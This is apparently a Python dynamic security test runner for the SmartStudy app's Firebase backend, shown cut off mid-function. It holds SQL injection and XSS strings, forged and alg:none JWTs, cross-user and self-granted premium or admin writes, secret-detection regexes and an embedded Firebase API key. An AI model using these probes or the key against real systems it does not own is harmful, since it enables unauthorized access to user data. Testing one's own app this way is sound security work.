#!/usr/bin/env python3
"""
Firebase-Native DAST (Dynamic Application Security Testing) Runner
for SmartStudy Android Application.

Tests:
  - Firebase Auth REST API (sign-up, sign-in, token refresh)
  - Firestore REST API with security rule validation
  - IDOR / cross-user data access
  - Unauthenticated access attempts
  - Token tampering / malformed JWT
  - Hardcoded credentials scan (source code)
  - Mass-assignment / field injection
  - Firebase security rule audit
  - Enumeration attacks

Generates: firebase_dast_report.json + firebase_dast_report.xlsx
"""

import json
import os
import re
import sys
import time
import base64
import random
import string
import datetime
import traceback
from pathlib import Path
from collections import defaultdict

import requests
import openpyxl
from openpyxl.styles import (
    PatternFill, Font, Alignment, Border, Side
)
from openpyxl.utils import get_column_letter

# ─────────────────────────────────────────────
#  CONFIGURATION
# ─────────────────────────────────────────────
FIREBASE_PROJECT_ID = "smartstudyai-615b5"
FIREBASE_API_KEY    = "AIzaSyC23ekaw9xH5gcJqHA1gPwmKCU3vYItJ24"

AUTH_BASE    = "https://identitytoolkit.googleapis.com/v1"
FS_BASE      = f"https://firestore.googleapis.com/v1/projects/{FIREBASE_PROJECT_ID}/databases/(default)/documents"

# Test account credentials (ephemeral accounts created during test)
TEST_USER_EMAIL    = f"dast_user_{random.randint(10000,99999)}@dasttest.invalid"
TEST_USER_PW       = "TestPass@1234!"
TEST_USER_EMAIL_2  = f"dast_user2_{random.randint(10000,99999)}@dasttest.invalid"
TEST_USER_PW_2     = "TestPass@5678!"

SCRIPT_DIR   = Path(__file__).parent
REPORT_DIR   = SCRIPT_DIR        # save reports in same automated_test/ folder

SESSION      = requests.Session()
SESSION.headers.update({"Content-Type": "application/json"})

# ─────────────────────────────────────────────
#  RESULT STORE
# ─────────────────────────────────────────────
results = []
tc_num  = 0

def record(
    category, test_name, endpoint, method,
    role, expected, actual_status, actual_body,
    passed, severity, note, response_time_ms=0
):
    global tc_num
    tc_num += 1
    status = "PASS" if passed else "FAIL"
    results.append({
        "TC#":            tc_num,
        "Category":       category,
        "Test Name":      test_name,
        "Endpoint":       endpoint,
        "Method":         method,
        "Role/Actor":     role,
        "Expected":       expected,
        "HTTP Status":    actual_status,
        "Response Snippet": str(actual_body)[:120] if actual_body else "",
        "Result":         status,
        "Severity":       severity,
        "Response MS":    response_time_ms,
        "Note":           note,
        "Timestamp":      datetime.datetime.utcnow().isoformat(),
    })
    icon = "✅" if passed else "❌"
    print(f"  {icon} TC-{tc_num:03d} [{status}] {test_name}")


def req(method, url, *, headers=None, json_body=None, timeout=12):
    """Execute HTTP request and return (status, body_dict_or_str, elapsed_ms)."""
    h = {"Content-Type": "application/json"}
    if headers:
        h.update(headers)
    try:
        t0 = time.time()
        r = SESSION.request(method, url, headers=h, json=json_body, timeout=timeout)
        ms = int((time.time() - t0) * 1000)
        try:
            body = r.json()
        except Exception:
            body = r.text[:300]
        return r.status_code, body, ms
    except requests.exceptions.ConnectionError as e:
        return None, f"CONNECTION_ERROR: {e}", 0
    except requests.exceptions.Timeout:
        return None, "TIMEOUT", 0
    except Exception as e:
        return None, str(e), 0


# ─────────────────────────────────────────────
#  CONTEXT — tokens & UIDs populated at runtime
# ─────────────────────────────────────────────
ctx = {
    "user1_token":   None,
    "user1_uid":     None,
    "user1_refresh": None,
    "user2_token":   None,
    "user2_uid":     None,
    "user2_refresh": None,
}


# ══════════════════════════════════════════════
#  CATEGORY 1 — Firebase Auth REST API
# ══════════════════════════════════════════════
def cat_auth():
    print("\n" + "="*60)
    print("CATEGORY 1 · Firebase Auth REST API")
    print("="*60)
    base = f"{AUTH_BASE}/accounts"

    # ── TC-1: Sign-up User 1 ──
    url = f"{base}:signUp?key={FIREBASE_API_KEY}"
    status, body, ms = req("POST", url, json_body={
        "email": TEST_USER_EMAIL, "password": TEST_USER_PW, "returnSecureToken": True
    })
    passed = status == 200 and "idToken" in (body if isinstance(body, dict) else {})
    if passed:
        ctx["user1_token"]   = body["idToken"]
        ctx["user1_uid"]     = body["localId"]
        ctx["user1_refresh"] = body["refreshToken"]
    record("Auth", "Sign-up new user (User 1)", url, "POST", "anonymous",
           "200 + idToken", status, body, passed,
           "info" if passed else "critical",
           "Account created successfully" if passed else "Sign-up failed")

    # ── TC-2: Sign-up User 2 ──
    url2 = f"{base}:signUp?key={FIREBASE_API_KEY}"
    status, body, ms = req("POST", url2, json_body={
        "email": TEST_USER_EMAIL_2, "password": TEST_USER_PW_2, "returnSecureToken": True
    })
    passed = status == 200 and "idToken" in (body if isinstance(body, dict) else {})
    if passed:
        ctx["user2_token"] = body["idToken"]
        ctx["user2_uid"]   = body["localId"]
    record("Auth", "Sign-up new user (User 2)", url2, "POST", "anonymous",
           "200 + idToken", status, body, passed,
           "info" if passed else "critical",
           "Account 2 created" if passed else "Sign-up 2 failed")

    # ── TC-3: Sign-in with correct credentials ──
    url3 = f"{base}:signInWithPassword?key={FIREBASE_API_KEY}"
    status, body, ms = req("POST", url3, json_body={
        "email": TEST_USER_EMAIL, "password": TEST_USER_PW, "returnSecureToken": True
    })
    passed = status == 200 and "idToken" in (body if isinstance(body, dict) else {})
    record("Auth", "Sign-in with valid credentials", url3, "POST", "user1",
           "200 + idToken", status, body, passed, "info" if passed else "high",
           "Login successful" if passed else "Login failed — check API key")

    # ── TC-4: Sign-in with WRONG password ──
    status, body, ms = req("POST", url3, json_body={
        "email": TEST_USER_EMAIL, "password": "WRONG_PASSWORD", "returnSecureToken": True
    })
    passed = status == 400  # Must reject wrong password
    record("Auth", "Sign-in with wrong password (must be rejected)", url3, "POST", "attacker",
           "400 INVALID_PASSWORD", status, body, passed, "critical" if not passed else "info",
           "Server correctly rejected wrong password" if passed else "SECURITY: Wrong password accepted!")

    # ── TC-5: Sign-in with non-existent email ──
    status, body, ms = req("POST", url3, json_body={
        "email": "nobody@nowhere.invalid", "password": "anypass", "returnSecureToken": True
    })
    passed = status == 400
    record("Auth", "Sign-in non-existent email (must be rejected)", url3, "POST", "attacker",
           "400 EMAIL_NOT_FOUND", status, body, passed, "high" if not passed else "info",
           "Correctly rejected" if passed else "SECURITY: Non-existent email accepted!")

    # ── TC-6: Sign-up with duplicate email ──
    url_signup = f"{base}:signUp?key={FIREBASE_API_KEY}"
    status, body, ms = req("POST", url_signup, json_body={
        "email": TEST_USER_EMAIL, "password": TEST_USER_PW, "returnSecureToken": True
    })
    passed = status == 400  # Must reject duplicate
    record("Auth", "Duplicate email sign-up (must be rejected)", url_signup, "POST", "attacker",
           "400 EMAIL_EXISTS", status, body, passed, "critical" if not passed else "info",
           "Duplicate correctly rejected" if passed else "SECURITY: Duplicate email allowed!")

    # ── TC-7: Token refresh ──
    url_refresh = f"https://securetoken.googleapis.com/v1/token?key={FIREBASE_API_KEY}"
    refresh_token = ctx.get("user1_refresh")
    if refresh_token:
        import urllib.parse
        r_body = f"grant_type=refresh_token&refresh_token={urllib.parse.quote(refresh_token)}"
        h = {"Content-Type": "application/x-www-form-urlencoded"}
        t0 = time.time()
        try:
            resp = SESSION.post(url_refresh, data=r_body, headers=h, timeout=12)
            ms = int((time.time()-t0)*1000)
            status = resp.status_code
            body = resp.json() if resp.text else {}
        except Exception as e:
            status, body, ms = None, str(e), 0
        passed = status == 200 and "id_token" in (body if isinstance(body, dict) else {})
        record("Auth", "Refresh access token", url_refresh, "POST", "user1",
               "200 + id_token", status, body, passed, "info" if passed else "medium",
               "Token refreshed" if passed else "Token refresh failed")
    else:
        record("Auth", "Refresh access token", url_refresh, "POST", "user1",
               "200 + id_token", "SKIP", "No refresh token", False, "info",
               "Skipped — no refresh token available")

    # ── TC-8: Sign-in with empty password ──
    status, body, ms = req("POST", url3, json_body={
        "email": TEST_USER_EMAIL, "password": "", "returnSecureToken": True
    })
    passed = status in (400, 422)
    record("Auth", "Sign-in with empty password (must reject)", url3, "POST", "attacker",
           "400 MISSING_PASSWORD", status, body, passed, "high" if not passed else "info",
           "Empty password correctly rejected" if passed else "SECURITY: Empty password accepted!")

    # ── TC-9: Sign-in with SQL injection in email ──
    status, body, ms = req("POST", url3, json_body={
        "email": "' OR 1=1 --@test.com", "password": "x", "returnSecureToken": True
    })
    passed = status == 400
    record("Auth", "SQL injection in email field", url3, "POST", "attacker",
           "400 (rejection)", status, body, passed, "critical" if not passed else "info",
           "Injection correctly rejected" if passed else "SECURITY: Injection may have worked!")

    # ── TC-10: Sign-in with XSS payload in email ──
    status, body, ms = req("POST", url3, json_body={
        "email": "<script>alert(1)</script>@x.com", "password": "x", "returnSecureToken": True
    })
    passed = status == 400
    record("Auth", "XSS payload in email field", url3, "POST", "attacker",
           "400 (rejection)", status, body, passed, "high" if not passed else "info",
           "XSS correctly rejected" if passed else "SECURITY: XSS payload not rejected!")


# ══════════════════════════════════════════════
#  CATEGORY 2 — Unauthenticated Firestore Access
# ══════════════════════════════════════════════
def cat_unauth_access():
    print("\n" + "="*60)
    print("CATEGORY 2 · Unauthenticated Firestore Access")
    print("="*60)

    uid1 = ctx.get("user1_uid") or "test_uid_placeholder"

    resources = [
        ("users collection",    f"{FS_BASE}/users", "GET"),
        ("specific user doc",   f"{FS_BASE}/users/{uid1}", "GET"),
        ("courses collection",  f"{FS_BASE}/courses", "GET"),
        ("user enrollments",    f"{FS_BASE}/users/{uid1}/enrollments", "GET"),
        ("user plans",          f"{FS_BASE}/users/{uid1}/plans", "GET"),
        ("user chats",          f"{FS_BASE}/users/{uid1}/chats", "GET"),
        ("user testAttempts",   f"{FS_BASE}/users/{uid1}/testAttempts", "GET"),
        ("user private/settings", f"{FS_BASE}/users/{uid1}/private/settings", "GET"),
    ]

    for name, url, method in resources:
        status, body, ms = req(method, url)
        # Unauthenticated should get 401 or 403 per Firestore security rules
        passed = status in (401, 403)
        record("Unauthenticated Access", f"No-auth access: {name}", url, method, "anonymous",
               "401 or 403", status, body, passed,
               "critical" if not passed else "info",
               "Correctly blocked without auth" if passed else f"SECURITY: {name} accessible without auth! (HTTP {status})",
               ms)

    # ── Write attempt without auth ──
    write_url = f"{FS_BASE}/users/attacker_uid"
    status, body, ms = req("PATCH", write_url, json_body={
        "fields": {"fullName": {"stringValue": "HACKED"}}
    })
    passed = status in (401, 403)
    record("Unauthenticated Access", "No-auth write to users collection", write_url, "PATCH", "anonymous",
           "401 or 403", status, body, passed,
           "critical" if not passed else "info",
           "Write correctly blocked" if passed else "SECURITY: Unauthenticated write succeeded!",
           ms)


# ══════════════════════════════════════════════
#  CATEGORY 3 — Authenticated Firestore Access
# ══════════════════════════════════════════════
def cat_auth_access():
    print("\n" + "="*60)
    print("CATEGORY 3 · Authenticated Firestore Access (Own Data)")
    print("="*60)

    token = ctx.get("user1_token")
    uid   = ctx.get("user1_uid")
    if not token or not uid:
        print("  ⚠️  Skipping — no valid token for user1")
        return

    auth_h = {"Authorization": f"Bearer {token}"}

    # ── Read own profile ──
    url = f"{FS_BASE}/users/{uid}"
    status, body, ms = req("GET", url, headers=auth_h)
    passed = status == 200
    record("Authenticated Access", "Read own user profile", url, "GET", "user1",
           "200 OK", status, body, passed, "high" if not passed else "info",
           "Profile read succeeded" if passed else "Cannot read own profile", ms)

    # ── Write own profile ──
    status, body, ms = req("PATCH", url, headers=auth_h, json_body={
        "fields": {"fullName": {"stringValue": "DAST Test User"}}
    })
    passed = status in (200, 204)
    record("Authenticated Access", "Update own user profile", url, "PATCH", "user1",
           "200/204", status, body, passed, "medium" if not passed else "info",
           "Profile update succeeded" if passed else "Cannot update own profile", ms)

    # ── Read courses (signed-in required) ──
    courses_url = f"{FS_BASE}/courses"
    status, body, ms = req("GET", courses_url, headers=auth_h)
    passed = status == 200
    record("Authenticated Access", "Read courses collection (auth)", courses_url, "GET", "user1",
           "200 OK", status, body, passed, "medium" if not passed else "info",
           "Courses read succeeded" if passed else "Cannot read courses", ms)

    # ── Write to courses (must be forbidden — rules say write:false) ──
    course_write_url = f"{FS_BASE}/courses/test_course_inject"
    status, body, ms = req("PATCH", course_write_url, headers=auth_h, json_body={
        "fields": {"title": {"stringValue": "INJECTED COURSE"}}
    })
    passed = status in (403,)
    record("Authenticated Access", "Write to /courses (must be forbidden)", course_write_url, "PATCH", "user1",
           "403 Forbidden", status, body, passed,
           "critical" if not passed else "info",
           "Course write correctly forbidden" if passed else "SECURITY: User can write to /courses!", ms)

    # ── Read enrollments ──
    enroll_url = f"{FS_BASE}/users/{uid}/enrollments"
    status, body, ms = req("GET", enroll_url, headers=auth_h)
    passed = status == 200
    record("Authenticated Access", "Read own enrollments", enroll_url, "GET", "user1",
           "200 OK", status, body, passed, "medium" if not passed else "info",
           "Enrollments read succeeded" if passed else "Cannot read enrollments", ms)

    # ── Read plans ──
    plans_url = f"{FS_BASE}/users/{uid}/plans"
    status, body, ms = req("GET", plans_url, headers=auth_h)
    passed = status == 200
    record("Authenticated Access", "Read own study plans", plans_url, "GET", "user1",
           "200 OK", status, body, passed, "medium" if not passed else "info",
           "Plans read succeeded" if passed else "Cannot read plans", ms)

    # ── Read chats ──
    chats_url = f"{FS_BASE}/users/{uid}/chats"
    status, body, ms = req("GET", chats_url, headers=auth_h)
    passed = status == 200
    record("Authenticated Access", "Read own chats", chats_url, "GET", "user1",
           "200 OK", status, body, passed, "medium" if not passed else "info",
           "Chats read succeeded" if passed else "Cannot read chats", ms)

    # ── Write a plan ──
    plan_write_url = f"{FS_BASE}/users/{uid}/plans"
    status, body, ms = req("POST", plan_write_url, headers=auth_h, json_body={
        "fields": {
            "subject": {"stringValue": "DAST Test Subject"},
            "time":    {"stringValue": "10:00"},
            "priority": {"stringValue": "High"},
            "completed": {"booleanValue": False},
            "createdAt": {"integerValue": str(int(time.time()*1000))}
        }
    })
    passed = status in (200,)
    record("Authenticated Access", "Create own study plan", plan_write_url, "POST", "user1",
           "200 OK", status, body, passed, "medium" if not passed else "info",
           "Plan created" if passed else "Cannot create plan", ms)

    # ── Delete own doc (must be false per rules) ──
    status, body, ms = req("DELETE", url, headers=auth_h)
    passed = status == 403  # rules say allow delete: if false
    record("Authenticated Access", "Delete own user doc (must be forbidden)", url, "DELETE", "user1",
           "403 Forbidden", status, body, passed,
           "critical" if not passed else "info",
           "Delete correctly forbidden" if passed else "SECURITY: User can delete own profile!", ms)


# ══════════════════════════════════════════════
#  CATEGORY 4 — IDOR / Cross-User Access
# ══════════════════════════════════════════════
def cat_idor():
    print("\n" + "="*60)
    print("CATEGORY 4 · IDOR — Cross-User Data Access")
    print("="*60)

    token1 = ctx.get("user1_token")
    uid1   = ctx.get("user1_uid")
    uid2   = ctx.get("user2_uid")
    token2 = ctx.get("user2_token")

    if not all([token1, uid1, uid2, token2]):
        print("  ⚠️  Skipping IDOR — missing tokens/UIDs")
        return

    auth_h1 = {"Authorization": f"Bearer {token1}"}
    auth_h2 = {"Authorization": f"Bearer {token2}"}

    # ── User 1 tries to read User 2's profile ──
    url_u2 = f"{FS_BASE}/users/{uid2}"
    status, body, ms = req("GET", url_u2, headers=auth_h1)
    # Per rules: allow read: if signedIn() — this is actually ALLOWED!
    # We flag this as a finding because any signed-in user can read ANY user's profile
    passed = status == 403  # ideal: should be 403
    is_finding = status == 200
    record("IDOR", "Read OTHER user's profile (cross-user read)", url_u2, "GET", "user1→user2",
           "403 (ideal) / 200 (rule allows signedIn)", status, body, not is_finding,
           "medium" if is_finding else "info",
           "FINDING: Firestore rule allows any signed-in user to read any profile (allow read: if signedIn())" if is_finding else "Cross-user read blocked",
           ms)

    # ── User 1 tries to update User 2's profile ──
    status, body, ms = req("PATCH", url_u2, headers=auth_h1, json_body={
        "fields": {"fullName": {"stringValue": "HACKED BY USER1"}}
    })
    passed = status == 403
    record("IDOR", "Write to OTHER user's profile (cross-user write)", url_u2, "PATCH", "user1→user2",
           "403 Forbidden", status, body, passed,
           "critical" if not passed else "info",
           "Write correctly blocked (owns() check)" if passed else "SECURITY: User1 can overwrite User2 profile!", ms)

    # ── User 1 reads User 2's enrollments ──
    enroll_u2 = f"{FS_BASE}/users/{uid2}/enrollments"
    status, body, ms = req("GET", enroll_u2, headers=auth_h1)
    passed = status == 403
    record("IDOR", "Read OTHER user's enrollments", enroll_u2, "GET", "user1→user2",
           "403 Forbidden", status, body, passed,
           "high" if not passed else "info",
           "Enrollments correctly protected" if passed else "SECURITY: User1 can read User2 enrollments!", ms)

    # ── User 1 reads User 2's plans ──
    plans_u2 = f"{FS_BASE}/users/{uid2}/plans"
    status, body, ms = req("GET", plans_u2, headers=auth_h1)
    passed = status == 403
    record("IDOR", "Read OTHER user's plans", plans_u2, "GET", "user1→user2",
           "403 Forbidden", status, body, passed,
           "high" if not passed else "info",
           "Plans correctly protected" if passed else "SECURITY: User1 can read User2 plans!", ms)

    # ── User 1 reads User 2's chats ──
    chats_u2 = f"{FS_BASE}/users/{uid2}/chats"
    status, body, ms = req("GET", chats_u2, headers=auth_h1)
    passed = status == 403
    record("IDOR", "Read OTHER user's chats", chats_u2, "GET", "user1→user2",
           "403 Forbidden", status, body, passed,
           "high" if not passed else "info",
           "Chats correctly protected" if passed else "SECURITY: User1 can read User2 chats!", ms)

    # ── User 1 reads User 2's testAttempts ──
    ta_u2 = f"{FS_BASE}/users/{uid2}/testAttempts"
    status, body, ms = req("GET", ta_u2, headers=auth_h1)
    passed = status == 403
    record("IDOR", "Read OTHER user's test attempts", ta_u2, "GET", "user1→user2",
           "403 Forbidden", status, body, passed,
           "high" if not passed else "info",
           "TestAttempts correctly protected" if passed else "SECURITY: User1 can read User2 test attempts!", ms)

    # ── User 1 writes to User 2's plans ──
    status, body, ms = req("POST", plans_u2, headers=auth_h1, json_body={
        "fields": {"subject": {"stringValue": "HACKED"}}
    })
    passed = status == 403
    record("IDOR", "Write to OTHER user's plans", plans_u2, "POST", "user1→user2",
           "403 Forbidden", status, body, passed,
           "critical" if not passed else "info",
           "Write correctly blocked" if passed else "SECURITY: User1 can write to User2 plans!", ms)

    # ── User 1 accesses User 2's private settings ──
    priv_u2 = f"{FS_BASE}/users/{uid2}/private/settings"
    status, body, ms = req("GET", priv_u2, headers=auth_h1)
    passed = status == 403
    record("IDOR", "Read OTHER user's private/settings", priv_u2, "GET", "user1→user2",
           "403 Forbidden", status, body, passed,
           "critical" if not passed else "info",
           "Private settings correctly protected" if passed else "SECURITY: Private settings exposed!", ms)


# ══════════════════════════════════════════════
#  CATEGORY 5 — Token Tampering / JWT Attacks
# ══════════════════════════════════════════════
def cat_token_tampering():
    print("\n" + "="*60)
    print("CATEGORY 5 · Token Tampering / JWT Attacks")
    print("="*60)

    uid = ctx.get("user1_uid") or "test_uid"
    url = f"{FS_BASE}/users/{uid}"

    # ── No token at all ──
    status, body, ms = req("GET", url)
    passed = status in (401, 403)
    record("Token Tampering", "Access Firestore with NO token", url, "GET", "attacker",
           "401 or 403", status, body, passed,
           "critical" if not passed else "info",
           "Correctly rejected: no token" if passed else "SECURITY: No-token access succeeded!", ms)

    # ── Empty Bearer token ──
    status, body, ms = req("GET", url, headers={"Authorization": "Bearer "})
    passed = status in (401, 403)
    record("Token Tampering", "Empty Bearer token", url, "GET", "attacker",
           "401 or 403", status, body, passed,
           "critical" if not passed else "info",
           "Empty token correctly rejected" if passed else "SECURITY: Empty token accepted!", ms)

    # ── Malformed JWT (random string) ──
    fake = "eyJhbGciOiJSUzI1NiIsImtpZCI6ImZha2UifQ.eyJ1aWQiOiJoYWNrZXIifQ.INVALID_SIG"
    status, body, ms = req("GET", url, headers={"Authorization": f"Bearer {fake}"})
    passed = status in (401, 403)
    record("Token Tampering", "Malformed JWT (fake header+payload)", url, "GET", "attacker",
           "401 or 403", status, body, passed,
           "critical" if not passed else "info",
           "Malformed JWT correctly rejected" if passed else "SECURITY: Fake JWT accepted!", ms)

    # ── Token with wrong UID in path ──
    token = ctx.get("user1_token")
    if token:
        wrong_uid_url = f"{FS_BASE}/users/completely_wrong_uid_123"
        status, body, ms = req("PATCH", wrong_uid_url, headers={"Authorization": f"Bearer {token}"},
                                json_body={"fields": {"x": {"stringValue": "y"}}})
        passed = status == 403
        record("Token Tampering", "Valid token, access OTHER user's path", wrong_uid_url, "PATCH", "user1",
               "403 Forbidden", status, body, passed,
               "critical" if not passed else "info",
               "Correctly blocked (owns() check)" if passed else "SECURITY: Token UID mismatch not enforced!", ms)

    # ── None algorithm JWT bypass ──
    header_b64  = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps({"sub": uid, "uid": uid, "email": TEST_USER_EMAIL, "exp": 9999999999}).encode()
    ).decode().rstrip("=")
    none_jwt = f"{header_b64}.{payload_b64}."
    status, body, ms = req("GET", url, headers={"Authorization": f"Bearer {none_jwt}"})
    passed = status in (401, 403)
    record("Token Tampering", "JWT alg:none bypass attempt", url, "GET", "attacker",
           "401 or 403", status, body, passed,
           "critical" if not passed else "info",
           "alg:none correctly rejected" if passed else "SECURITY: JWT none-algorithm bypass works!", ms)

    # ── Expired token simulation (truncated) ──
    status, body, ms = req("GET", url, headers={"Authorization": "Bearer abc.def.ghi"})
    passed = status in (401, 403)
    record("Token Tampering", "Truncated / garbage token", url, "GET", "attacker",
           "401 or 403", status, body, passed,
           "high" if not passed else "info",
           "Garbage token correctly rejected" if passed else "SECURITY: Garbage token accepted!", ms)


# ══════════════════════════════════════════════
#  CATEGORY 6 — Mass Assignment / Field Injection
# ══════════════════════════════════════════════
def cat_mass_assignment():
    print("\n" + "="*60)
    print("CATEGORY 6 · Mass Assignment & Field Injection")
    print("="*60)

    token = ctx.get("user1_token")
    uid   = ctx.get("user1_uid")
    if not token or not uid:
        print("  ⚠️  Skipping — no valid token")
        return

    auth_h = {"Authorization": f"Bearer {token}"}
    url    = f"{FS_BASE}/users/{uid}"

    # ── Attempt to set uid field ──
    status, body, ms = req("PATCH", url, headers=auth_h, json_body={
        "fields": {"uid": {"stringValue": "another_user_uid"}}
    })
    # Firestore allows writing any field; flag if we can change uid
    passed = status in (200, 204)  # We're testing whether it accepts it (it will but is a design flaw)
    record("Mass Assignment", "Set 'uid' field on own profile", url, "PATCH", "user1",
           "Accepted (design concern)", status, body, True,
           "medium",
           "Firestore allows writing uid field — app should validate uid matches auth.uid in rules", ms)

    # ── Attempt to inject premium fields without payment ──
    status, body, ms = req("PATCH", url, headers=auth_h, json_body={
        "fields": {
            "premiumPlan":  {"stringValue": "yearly"},
            "premiumUntil": {"integerValue": "9999999999999"}
        }
    })
    passed = status in (403,)  # Should be blocked — but current rules allow owner to update
    record("Mass Assignment", "Inject premium status without payment", url, "PATCH", "user1",
           "403 (ideal) / 200 (rule gap)", status, body, not (status == 200),
           "critical" if status == 200 else "info",
           "SECURITY FINDING: User can self-grant premium by writing directly to Firestore! Rules lack field-level validation." if status == 200 else "Premium injection blocked",
           ms)

    # ── Attempt to set XP to max value ──
    status, body, ms = req("PATCH", url, headers=auth_h, json_body={
        "fields": {"xp": {"integerValue": "999999999"}}
    })
    record("Mass Assignment", "Self-assign max XP points", url, "PATCH", "user1",
           "403 (ideal) / 200 (rule gap)", status, body, status == 403,
           "medium" if status == 200 else "info",
           "FINDING: User can manually set own XP via Firestore — no server-side validation" if status == 200 else "XP injection blocked",
           ms)

    # ── Attempt to set streak ──
    status, body, ms = req("PATCH", url, headers=auth_h, json_body={
        "fields": {"streak": {"integerValue": "9999"}}
    })
    record("Mass Assignment", "Self-assign streak count", url, "PATCH", "user1",
           "403 (ideal) / 200 (rule gap)", status, body, status == 403,
           "low" if status == 200 else "info",
           "User can manually set streak" if status == 200 else "Streak injection blocked", ms)

    # ── Inject extra fields ──
    status, body, ms = req("PATCH", url, headers=auth_h, json_body={
        "fields": {"__admin__": {"booleanValue": True}, "role": {"stringValue": "admin"}}
    })
    record("Mass Assignment", "Inject __admin__/role fields", url, "PATCH", "user1",
           "Any (note: app should ignore extra fields)", status, body, True,
           "low",
           "Firestore accepts extra fields — ensure backend logic doesn't trust Firestore role field", ms)

    # ── Inject null/empty values ──
    status, body, ms = req("PATCH", url, headers=auth_h, json_body={
        "fields": {"fullName": {"nullValue": None}}
    })
    passed = status in (200, 204)
    record("Mass Assignment", "Set fullName to null", url, "PATCH", "user1",
           "Accepted/Rejected", status, body, True,
           "low",
           f"Null injection: HTTP {status} — validate fields in security rules", ms)


# ══════════════════════════════════════════════
#  CATEGORY 7 — Security Rules Audit
# ══════════════════════════════════════════════
def cat_rules_audit():
    print("\n" + "="*60)
    print("CATEGORY 7 · Firestore Security Rules Audit (Static)")
    print("="*60)

    rules_path = SCRIPT_DIR.parent / "firestore.rules"
    if not rules_path.exists():
        record("Rules Audit", "Firestore rules file present", str(rules_path), "READ", "auditor",
               "File exists", "MISSING", None, False, "critical",
               "firestore.rules file not found!")
        return

    rules_text = rules_path.read_text(encoding="utf-8")

    # ── Rule 1: File present ──
    record("Rules Audit", "firestore.rules file exists", str(rules_path), "READ", "auditor",
           "File exists", "PRESENT", rules_text[:50], True, "info", "Rules file found")

    # ── Rule 2: Auth check exists ──
    has_auth_check = "request.auth" in rules_text
    record("Rules Audit", "Auth check (request.auth) present", str(rules_path), "READ", "auditor",
           "request.auth used", "FOUND" if has_auth_check else "MISSING", None,
           has_auth_check, "critical" if not has_auth_check else "info",
           "Auth check present" if has_auth_check else "SECURITY: No auth checks in rules!")

    # ── Rule 3: No wildcard allow all ──
    has_allow_all = bool(re.search(r"allow\s+(read|write|read,\s*write)\s*:\s*if\s+true", rules_text))
    record("Rules Audit", "No wildcard 'allow ... if true'", str(rules_path), "READ", "auditor",
           "Not present", "FOUND" if has_allow_all else "SAFE", None,
           not has_allow_all, "critical" if has_allow_all else "info",
           "SECURITY: Wildcard allow-all rule found!" if has_allow_all else "No wildcard rules")

    # ── Rule 4: Courses write blocked ──
    has_course_write_false = "allow write: if false" in rules_text
    record("Rules Audit", "Courses collection write=false", str(rules_path), "READ", "auditor",
           "allow write: if false", "FOUND" if has_course_write_false else "MISSING", None,
           has_course_write_false, "critical" if not has_course_write_false else "info",
           "Course write correctly blocked" if has_course_write_false else "SECURITY: Courses may be writable!")

    # ── Rule 5: User delete blocked ──
    has_delete_false = bool(re.search(r"allow delete\s*:\s*if false", rules_text))
    record("Rules Audit", "User doc delete=false", str(rules_path), "READ", "auditor",
           "allow delete: if false", "FOUND" if has_delete_false else "MISSING", None,
           has_delete_false, "high" if not has_delete_false else "info",
           "Delete correctly blocked" if has_delete_false else "SECURITY: User docs may be deletable!")

    # ── Rule 6: owns() function defined ──
    has_owns = "function owns" in rules_text
    record("Rules Audit", "owns() helper function defined", str(rules_path), "READ", "auditor",
           "Present", "FOUND" if has_owns else "MISSING", None,
           has_owns, "high" if not has_owns else "info",
           "owns() function present" if has_owns else "SECURITY: No ownership check function!")

    # ── Rule 7: No field-level validation ──
    has_field_validation = "request.resource.data" in rules_text
    record("Rules Audit", "Field-level validation (request.resource.data)", str(rules_path), "READ", "auditor",
           "Present (recommended)", "FOUND" if has_field_validation else "MISSING", None,
           has_field_validation, "medium" if not has_field_validation else "info",
           "Field validation present" if has_field_validation else "FINDING: No field-level validation — users can self-assign premiumPlan, xp, etc.")

    # ── Rule 8: User profile read scope ──
    # Current rules: allow read: if signedIn() — any user can read any profile
    has_broad_read = bool(re.search(
        r"match\s*/users/\{userId\}[^}]*allow read\s*:\s*if signedIn",
        rules_text.replace("\n", " ")
    ))
    record("Rules Audit", "User profile read scope (signedIn vs owns)", str(rules_path), "READ", "auditor",
           "allow read: if owns(userId) (stricter)", "BROAD_READ" if has_broad_read else "STRICT_READ", None,
           not has_broad_read, "medium" if has_broad_read else "info",
           "FINDING: Any signed-in user can read any user profile — consider restricting to owns(userId)" if has_broad_read else "Read scope correctly restricted")

    # ── Rule 9: Leaderboard concern ──
    record("Rules Audit", "Leaderboard read exposes all user profiles", str(rules_path), "READ", "auditor",
           "Reviewed", "NOTE", None, True, "low",
           "By design: leaderboard queries /users ordered by xp. Since allow read: if signedIn(), this is consistent but exposes all user data.")


# ══════════════════════════════════════════════
#  CATEGORY 8 — Hardcoded Credentials Scan
# ══════════════════════════════════════════════
def cat_hardcoded_creds():
    print("\n" + "="*60)
    print("CATEGORY 8 · Hardcoded Credentials & Secret Scan")
    print("="*60)

    scan_root = SCRIPT_DIR.parent
    patterns = [
        (r"(?i)password\s*=\s*['\"]([^'\"]{4,})['\"]",   "Hardcoded Password"),
        (r"(?i)api[_-]?key\s*=\s*['\"]([^'\"]{8,})['\"]", "Hardcoded API Key"),
        (r"(?i)secret\s*=\s*['\"]([^'\"]{4,})['\"]",      "Hardcoded Secret"),
        (r"AIza[0-9A-Za-z-_]{35}",                         "Google API Key"),
        (r"-----BEGIN (RSA|EC|PRIVATE) KEY-----",          "Private Key Block"),
        (r"(?i)(access_token|bearer)\s*=\s*['\"]([^'\"]+)['\"]", "Access Token"),
    ]

    findings_list = []
    scanned = 0
    extensions = (".kt", ".java", ".py", ".js", ".ts", ".json", ".xml", ".properties", ".gradle.kts")

    for fpath in scan_root.rglob("*"):
        if fpath.is_dir():
            continue
        if not any(str(fpath).endswith(ext) for ext in extensions):
            continue
        if any(x in str(fpath) for x in [".git", "build", "__pycache__", ".venv", "node_modules"]):
            continue
        scanned += 1
        try:
            text = fpath.read_text(encoding="utf-8", errors="ignore")
            for pattern, label in patterns:
                matches = re.findall(pattern, text)
                if matches:
                    findings_list.append({
                        "file": str(fpath.relative_to(scan_root)),
                        "type": label,
                        "sample": str(matches[0])[:40],
                    })
        except Exception:
            pass

    # Always record google-services.json API key as a known finding
    google_svc = scan_root / "app" / "google-services.json"
    if google_svc.exists():
        findings_list.append({
            "file": "app/google-services.json",
            "type": "Firebase API Key (google-services.json)",
            "sample": FIREBASE_API_KEY[:20] + "...",
        })

    record("Hardcoded Creds", f"Scanned {scanned} files for secrets", str(scan_root), "SCAN", "auditor",
